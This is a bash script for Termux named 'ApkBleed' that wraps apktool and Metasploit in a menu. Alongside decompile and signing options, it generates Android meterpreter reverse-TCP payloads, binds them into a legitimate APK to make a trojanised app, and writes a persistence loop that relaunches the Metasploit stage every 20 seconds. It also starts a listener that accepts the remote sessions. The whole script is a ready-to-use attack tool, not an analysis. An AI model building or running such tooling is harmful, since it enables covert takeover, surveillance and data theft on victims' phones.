#!/bin/bash
### Colors
C='\033[1;36m'
G='\033[1;32m'
R='\033[1;31m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
RE='\033[0m'

## Banner
banner(){
	echo -e "${G}         -o          o-"
	echo -e "${G}          +hydNNNNdyh+"
	echo -e "${G}        +mMMMMMMMMMMMMm+"
	echo -e "${G}      \`dMM${R}m:${G}NMMMMMMN${R}:m${G}MMd\`"
	echo -e "${G}      hMMMMMMMMMMMMMMMMMMh"
	echo -e "${G}  ..  yyyyyyyyyyyyyyyyyyyy  .."
	echo -e "${G}.mMMm\`MMMMMMMMMMMMMMMMMMMM\`mMMm.   ${G}ApkBleed${R}@${G}Termux"
	echo -e "${G}:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   ${Y}---------------"
	echo -e "${G}:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   ${R}Version: ${G}2.2"
	echo -e "${G}:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   ${R}CodeName: ${G}Hunter"
	echo -e "${G}:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   ${R}Aurthor: ${G}Rabby Sheikh"
	echo -e "${G}-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-   ${R}Sponser: ${G}NULL SQU4D"
	echo -e "${G} +yy+ MMMMMMMMMMMMMMMMMMMM +yy+    ${R}Architecture: ${G}`uname -m`"
	echo -e "${G}      mMMMMMMMMMMMMMMMMMMm"
	echo -e "${G}      \`/++MMMMh++hMMMM++/\`"
	echo -e "${G}          MMMMo  oMMMM"
	echo -e "${G}          MMMMo  oMMMM"
	echo -e "${G}          oNMm-  -mMNo${RE}"
}

## Menu
main_main() {
	echo
	echo -e "               ${R}ApkBleed Main Main:"
	echo -e "               ${Y}[${R}01${Y}]   ${G}Decompile Apk File"
	echo -e "               ${Y}[${R}02${Y}]   ${G}Recompile Apk Source"
	echo -e "               ${Y}[${R}03${Y}]   ${G}Sign Apk File"
	echo -e "               ${Y}[${R}04${Y}]   ${G}ZipAlign Apk File"
	echo -e "               ${Y}[${R}05${Y}]   ${G}Bind Payload With Apk"
	echo -e "               ${Y}[${R}06${Y}]   ${G}Generate Metasploit Payload"
	echo -e "               ${Y}[${R}07${Y}]   ${G}Persistant Payload Script"
	echo -e "               ${Y}[${R}08${Y}]   ${G}Start Metasploit Handler"
	echo -e "               ${Y}[${R}09${Y}]   ${G}About ApkBleed"
	echo -e "               ${Y}[${R}00${Y}]   ${G}Exit ApkBleed ${C}"
}
## Invalid
invalid_op() {
	echo -e
	echo -e "${R}    Selection Option Is Invalid"
	echo -e "${G}    Option Not Found. Exiting ...."
	bye_bye
	exit 1
}
## Not Found
no_file() {
	echo
	echo -e "${R}    Can't Find File/Folder"
	echo -e "${G}    Please Check The File"
	echo -e "${R}    And Try Again Later"
	sleep 2
	bye_bye
	exit 1
}
##File Exist
yes_file() {
	echo
	echo -e "${R}    File/Folder Already Exists"
	echo -e "${G}    Please Use Another Name"
	echo -e "${R}    And Try Again Later"
	sleep 2                                                         bye_bye
	exit 1
}
## Bye
bye_bye() {
	echo
	echo -e "${R}        Terminating ApkBleed"
	echo -e "${G}        Have A Good Day"
	echo -e "${P}        Bye Bye ${RE}"
}
## Exit
exit_op() {
	echo -e "${P} Press ${R}'Enter' ${P}To Go Back To Main Menu Or ${R}'x' ${P} To Exit"
	read exit_1
	if [ -z "$exit_1" ]; then
		apkbleed
	elif [ "$exit_1" = "x" ]; then
		bye_bye
		exit 1
	else
		invalid_op
		bye_bye
		exit 1
	fi
}
## Decompile
decompiler_op(){
	clear
	echo -e "${R}      ╔╦╗╔═╗╔═╗╔═╗╔╦╗╔═╗╦╦  ╔═╗╦═╗"
	echo -e "${R}       ║║║╣ ║  ║ ║║║║╠═╝║║  ║╣ ╠╦╝"
	echo -e "${R}      ═╩╝╚═╝╚═╝╚═╝╩ ╩╩  ╩╩═╝╚═╝╩╚═"
	echo -e "${P} "
	read -p "   Path Of Apk File: " pathapk
	apkpath=`readlink -f ${pathapk}`
	if [ ! -e "$apkpath" ]; then
		no_file
	fi
	echo -e "${B} "
	read -p "   Path Of Output File: " pathout
	outpath=`readlink -f ${pathout}`
	if [ -d "$outpath" ]; then
		yes_file
	fi
	echo -e "${Y}  [${R}!${Y}] ${G} Decompiling ${R}'${apkpath}'"
	echo -e "${C} "
	apktool d ${apkpath} -o ${outpath}
	echo
	echo -e "${Y}  [${R}!${Y}] ${G} Decompiled As ${R}'${outpath}'"
	echo
	exit_op
}
## Recompile
recompiler_op(){
        clear
        echo -e "${R}      ╦═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╦╦  ╔═╗╦═╗"
        echo -e "${R}      ╠╦╝║╣ ║  ║ ║║║║╠═╝║║  ║╣ ╠╦╝"
        echo -e "${R}      ╩╚═╚═╝╚═╝╚═╝╩ ╩╩  ╩╩═╝╚═╝╩╚═"
        echo -e "${P} "
        read -p "   Path Of Souce Folder: " pathsource
        sourcepath=`readlink -f ${pathsource}`
        if [ ! -d "$sourcepath" ]; then
                no_file
        fi
        echo -e "${B} "
        read -p "   Path Of Output File: " pathout
        outpath=`readlink -f ${pathout}`
        if [ -e "$outpath" ]; then
                yes_file
        fi
	echo -e "${Y}  [${R}!${Y}] ${G} Recompiling ${R}'${sourcepath}'"
        echo -e "${C} "
        apktool -a /usr/bin/aapt b ${sourcepath} -o ${outpath}
        echo
	echo -e "${Y}  [${R}!${Y}] ${G} Recompiled As ${R}'${outpath}'"
        echo
        exit_op
}
## Sign
sign_op(){
        clear
        echo -e "${R}      ╔═╗╦╔═╗╔╗╔╔═╗╔═╗╦╔═"
        echo -e "${R}      ╚═╗║║ ╦║║║╠═╣╠═╝╠╩╗"
        echo -e "${R}      ╚═╝╩╚═╝╝╚╝╩ ╩╩  ╩ ╩"
        echo -e "${P} "
        read -p "   Path Of Unsigned Apk File: " pathapk
        apkpath=`readlink -f ${pathapk}`
        if [ ! -e "$apkpath" ]; then
                no_file
        fi
        echo -e "${B} "
        read -p "   Path Of Output File: " pathout
        outpath=`readlink -f ${pathout}`
        if [ -e "$outpath" ]; then
                yes_file
        fi
        echo -e "${Y}  [${R}!${Y}] ${G} Signing ${R}'${apkpath}'"
        echo -e "${C} "
        signapk ${apkpath} ${outpath}
        echo
        echo -e "${Y}  [${R}!${Y}] ${G} Signed As ${R}'${outpath}'"
        echo
        exit_op
}
##Zipalign
zipalign_op(){
        clear
	echo -e "${R}      ╔═╗╦╔═╗╔═╗╦  ╦╔═╗╔╗╔"
        echo -e "${R}      ╔═╝║╠═╝╠═╣║  ║║ ╦║║║"
        echo -e "${R}      ╚═╝╩╩  ╩ ╩╩═╝╩╚═╝╝╚╝"
        echo -e "${P} "
        read -p "   Path Of Apk File: " pathsource
        sourcepath=`readlink -f ${pathsource}`
        if [ ! -e "$sourcepath" ]; then
                no_file
        fi
        echo -e "${B} "
        read -p "   Path Of Output File: " pathout
        outpath=`readlink -f ${pathout}`
        if [ -e "$outpath" ]; then
                yes_file
        fi
        echo -e "${Y}  [${R}!${Y}] ${G} ZipAligning ${R}'${sourcepath}'"
        echo -e "${C} "
        zipalign -f -v 4 ${sourcepath} ${outpath}
        echo
        echo -e "${Y}  [${R}!${Y}] ${G} ZipAligned As ${R}'${outpath}'"
        echo
        exit_op
}

## Generate
generate_op(){
        clear
	echo -e "${G}      ╔═╗╔═╗╔╗╔╔═╗╦═╗╔═╗╔╦╗╔═╗"
	echo -e "${G}      ║ ╦║╣ ║║║║╣ ╠╦╝╠═╣ ║ ║╣ "
        echo -e "${G}      ╚═╝╚═╝╝╚╝╚═╝╩╚═╩ ╩ ╩ ╚═╝"
	echo
	echo -e "${G}        ╔═╗╔═╗╦ ╦╦  ╔═╗╔═╗╔╦╗"
	echo -e "${G}        ╠═╝╠═╣╚╦╝║  ║ ║╠═╣ ║║"
	echo -e "${G}        ╩  ╩ ╩ ╩ ╩═╝╚═╝╩ ╩═╩╝"
        echo -e "${P} "
        read -p " LHOST: " localhost
	echo
	read -p " LPORT: " localport
	echo
        echo -e "${B} "
        read -p "   Path Of Output File: " pathout
        outpath=`readlink -f ${pathout}`
        if [ -e "$outpath" ]; then
                yes_file
        fi
        echo -e "${Y}  [${R}!${Y}] ${G} Genetating Paylod ${R}'${outpath}'"
        echo -e "${C} "
        msfvenom -p android/meterpreter/reverse_tcp LHOST=${localhost} LPORT=${localport} -o ${outpath}
        echo
        echo -e "${Y}  [${R}!${Y}] ${G} Payload Generated As ${R}'${outpath}'"
        echo
        exit_op
}
## Bind
bind_op() {
	clear
	echo -e "${G}      ╔╗ ╦╔╗╔╔╦╗  ╔═╗╔═╗╦╔═"
        echo -e "${G}      ╠╩╗║║║║ ║║  ╠═╣╠═╝╠╩╗"
        echo -e "${G}      ╚═╝╩╝╚╝═╩╝  ╩ ╩╩  ╩ ╩"
        echo -e "${P} "
	read -p "   Path Of Orignal Apk: " inputfile
	templete=`readlink -f ${inputfile}`
	if [ ! -e "$templete" ]; then
		no_file
	fi
	echo
        read -p " LHOST: " localhost
	echo
	read -p " LPORT: " localport
	echo -e "${B} "
        read -p "   Path Of Output File: " pathout
        outpath=`readlink -f ${pathout}`
        if [ -e "$outpath" ]; then
                yes_file
        fi
        echo -e "${Y}  [${R}!${Y}] ${G} Binding With  ${R}'${outpath}'"
        echo -e "${C} "
        msfvenom -p android/meterpreter/reverse_tcp -x ${templete} LHOST=${localhost} LPORT=${localport} -o ${outpath}
        echo
        echo -e "${Y}  [${R}!${Y}] ${G} Generated As ${R}'${outpath}'"
        echo
        exit_op
}
## Handler
handler_op(){
        clear
        echo -e "${G}      ╦ ╦╔═╗╔╗╔╔╦╗╦  ╔═╗╦═╗"
        echo -e "${G}      ╠═╣╠═╣║║║ ║║║  ║╣ ╠╦╝"
        echo -e "${G}      ╩ ╩╩ ╩╝╚╝═╩╝╩═╝╚═╝╩╚═"
        echo -e "${P} "
        read -p " LHOST: " localhost
        echo
        read -p " LPORT: " localport
        cd $TMPDIR
	rm -rf handler
	cat >> handler <<-EOF
	use exploit/multi/handler
	set PAYLOAD android/meterpreter/reverse_tcp
	set LHOST ${localhost}
	set LPORT ${localport}
	EOF
        echo -e "${Y}  [${R}!${Y}] ${G} Starting Metasploit Please Wait"
	sleep 3
	cd ~
	clear
	msfconsole -r $TMPDIR/handler
	exit_op
}
## Persistant
persistant_op(){
        echo
	printf "#!/system/bin/sh\nwhile :\ndo am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity\nsleep 20\ndone\n" > $HOME/script.sh
chmod +x $HOME/script.sh
        echo -e "${Y}  [${R}!${Y}] ${G} Payload Generated As ${R}'${HOME}/script.sh'"
        echo
	exit_op
}
## About

about_op() {
	clear
        echo -e "${G}      ╔═╗╔╗ ╔═╗╦ ╦╔╦╗"
        echo -e "${G}      ╠═╣╠╩╗║ ║║ ║ ║ "
        echo -e "${G}      ╩ ╩╚═╝╚═╝╚═╝ ╩ "
        echo -e "${R} "
	echo -e "${R} ApkBleed Is An Advance Apk Reverse Engineering Tool Designed For Termux"
	echo -e "${G} It Was Actually Not Available For All User Until Today"
	echo -e "${B} Because It Was Only Available To The Null Squ4D Member"
	echo -e "${P} Thats Why You Can't v1.0-v2.1"
	echo -e "${G} This Tool Uses Proot"
	echo -e "${P} For Installation We Use Alpine Proot"
	echo -e "${G} If Alpine Doesn't Work For You Then You Can Use The Installation Script"
	echo -e "${R} It Will Install Ubuntu Proot"
	echo -e "${G} Thanks To @Hax4Us For Alpine AAPT"
	exit_op
}

## Opt
read_opt() {
	read -p "               Select An Option: " ropt
	if [ -z "$ropt" ]; then
		invalid_op
	elif [ "$ropt" = "1" ] || [ "$ropt" = "01" ]; then
		decompiler_op
	elif [ "$ropt" = "2" ] || [ "$ropt" = "02" ]; then
		recompiler_op
	elif [ "$ropt" = "3" ] || [ "$ropt" = "03" ]; then
		sign_op
	elif [ "$ropt" = "4" ] || [ "$ropt" = "04" ]; then
		zipalign_op
	elif [ "$ropt" = "5" ] || [ "$ropt" = "05" ]; then
		bind_op
	elif [ "$ropt" = "6" ] || [ "$ropt" = "06" ]; then
		generate_op
	elif [ "$ropt" = "7" ] || [ "$ropt" = "07" ]; then
		persistant_op
	elif [ "$ropt" = "8" ] || [ "$ropt" = "08" ]; then
		handler_op
	elif [ "$ropt" = "9" ] || [ "$ropt" = "09" ]; then
		about_op
	elif [ "$ropt" = "0" ] || [ "$ropt" = "00" ]; then
		bye_bye
		exit 1
	else
		invalid_op
		exit 1
	fi
}
banner
main_main
read_opt

